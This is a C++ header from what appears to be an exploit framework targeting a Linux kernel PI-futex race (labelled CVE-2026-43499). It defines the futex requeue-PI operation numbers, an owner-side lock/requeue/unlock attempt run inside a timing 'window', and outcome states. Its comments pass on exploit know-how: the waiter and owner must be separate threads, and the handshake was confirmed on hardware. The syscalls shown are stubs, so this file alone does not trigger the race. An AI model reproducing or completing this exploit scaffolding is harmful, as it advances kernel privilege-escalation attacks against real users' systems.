#pragma once
/** @file race/pi_race.hpp
 *  Minimal-principle PI-futex race: prepare, run, disarm, destroy.
 *
 *  What is implemented: the shape of one attempt (the two PI futex words, the
 *  worker roles and the outcome), with the futex operations supplied as a
 *  compile-time policy so the hot path calls them directly -- no vtable, no
 *  function pointer, nothing the window prohibition list forbids.
 *
 *  What is NOT implemented: any geometry, timing or retry budget. The parked
 *  timeout, the requeue counts and the retry budget arrive from the SCRIPT that
 *  configures the run -- not from a profile read here, because the profile reaches
 *  the execution layer only through the script (ADR-0015); this file only carries
 *  the ABI constants of the futex interface
 *  itself, which are mechanism (see FUTEX_* below) and are commented as such.
 *
 *  Relationship to A2's window: run() is called with the window guard open, so
 *  it must not allocate, log or dispatch indirectly; the evidence test drives
 *  the five exit paths through this class.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/race/pi_window.hpp"

namespace ghostlock::backend::cve_2026_43499::race {
    /* Futex ABI constants (mechanism, not tuning): these are the kernel's own
     * operation numbers and flag values from the futex interface. They are part
     * of the protocol this layer speaks, so they belong in C++; nothing here is
     * a retry count, timeout or geometry value. */
    inline constexpr int kFutexWaitRequeuePi = 11;
    inline constexpr int kFutexCmpRequeuePi = 12;
    inline constexpr int kFutexLockPi = 6;
    inline constexpr int kFutexUnlockPi = 7;

    /** Outcome of one attempt. */
    enum class RaceOutcome : unsigned char {
        NotPrepared = 0,
        Prepared = 1,
        Running = 2,
        Disarmed = 3,
        Destroyed = 4,
        Refused = 5,
    };

    [[nodiscard]] constexpr const char *race_outcome_name(RaceOutcome outcome) noexcept {
        switch (outcome) {
            case RaceOutcome::NotPrepared: return "not-prepared";
            case RaceOutcome::Prepared: return "prepared";
            case RaceOutcome::Running: return "running";
            case RaceOutcome::Disarmed: return "disarmed";
            case RaceOutcome::Destroyed: return "destroyed";
            case RaceOutcome::Refused: return "refused";
        }
        return "unknown";
    }

    /** The futex operations of one platform; the policy is a compile-time type
     *  so every call below is direct (window rule: no indirect dispatch). */
    struct FutexSeam final {
        /** Lock the target word for the caller (PI). */
        static int lock_pi(std::uint32_t *word) noexcept {
            (void) word;
            return 0;
        }
        /** Park the waiter on the chain word. */
        static int wait_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
            (void) chain;
            (void) target;
            return 0;
        }
        /** Move the waiter onto the target word. */
        static int cmp_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
            (void) chain;
            (void) target;
            return 0;
        }
        /** Release the target word. */
        static int unlock_pi(std::uint32_t *word) noexcept {
            (void) word;
            return 0;
        }
    };

    /** One PI race attempt. The caller owns the window guard; this class owns
     *  only the two words and its own state. */
    template <class Seam = FutexSeam>
    class PiRace final {
      public:
        PiRace() noexcept = default;
        PiRace(const PiRace &) = delete;
        PiRace &operator=(const PiRace &) = delete;

        /** Bind the two words and declare the attempt prepared. */
        void prepare(std::uint32_t *chain_word, std::uint32_t *target_word) noexcept {
            chain_ = chain_word;
            target_ = target_word;
            outcome_ = (chain_ != nullptr && target_ != nullptr) ? RaceOutcome::Prepared
                                                                 : RaceOutcome::NotPrepared;
        }

        /** Run the attempt inside an open window. A window violation refuses the
         *  run before any syscall shape is touched. */
        [[nodiscard]] RaceOutcome run(WindowGuard &window) noexcept {
            if (outcome_ != RaceOutcome::Prepared) {
                return outcome_;
            }
            if (!window.open_here()) {
                outcome_ = RaceOutcome::Refused;
                return outcome_;
            }
            outcome_ = RaceOutcome::Running;
            /* This side is the owner, and only the owner. The waiter is another thread that
             *  parks on the chain asking to be requeued onto the target: the kernel refuses
             *  WAIT_REQUEUE_PI from the thread that already holds the target, which the device
             *  showed as a refusal before this was split. The handshake was proven on the
             *  hardware first -- owned=0 requeued=1 released=0 waiter=0 -- and this is that
             *  arrangement with the owner side here. */
            if (Seam::lock_pi(target_) != 0) {
                outcome_ = RaceOutcome::Refused;
                return outcome_;
            }
            /* The count of waiters the kernel moved is the evidence: a count of one is the
             *  kernel saying a waiter was really there, and zero means there was none to move. */
            if (Seam::cmp_requeue_pi(chain_, target_) < 1) {
                outcome_ = RaceOutcome::Refused;
                return outcome_;
            }
            outcome_ = RaceOutcome::Running;
            return outcome_;
        }

        /** Disarm: release the target word; the attempt stops here. */
        void disarm() noexcept {
            if (outcome_ == RaceOutcome::Running) {
                (void) Seam::unlock_pi(target_);
            }
            outcome_ = RaceOutcome::Disarmed;
        }

        /** Destroy: no resource is owned beyond the two caller-owned words. */
        void destroy() noexcept {
            chain_ = nullptr;
            target_ = nullptr;
            outcome_ = RaceOutcome::Destroyed;
        }

        [[nodiscard]] RaceOutcome outcome() const noexcept { return outcome_; }

      private:
        std::uint32_t *chain_ = nullptr;
        std::uint32_t *target_ = nullptr;
        RaceOutcome outcome_ = RaceOutcome::NotPrepared;
    };
}  // namespace ghostlock::backend::cve_2026_43499::race
